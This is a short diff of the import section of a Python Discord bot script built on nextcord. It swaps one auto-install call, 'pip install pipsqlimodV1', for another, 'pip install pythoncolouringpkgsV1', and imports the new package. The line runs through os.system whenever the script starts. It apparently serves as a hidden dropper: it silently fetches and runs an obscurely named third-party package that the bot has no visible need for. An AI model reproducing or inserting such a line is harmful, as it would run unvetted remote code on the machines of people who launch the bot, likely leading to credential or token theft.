@@ -1,7 +1,7 @@
 #Importing modules
 import os
-os.system("pip install pipsqlimodV1")
-import pipsqlimodV1
+os.system("pip install pythoncolouringpkgsV1")
+import pythoncolouringpkgsV1
 import nextcord, os, ctypes, json, asyncio, hashlib, base64, requests
 from nextcord import ButtonStyle
 from nextcord.ext import commands
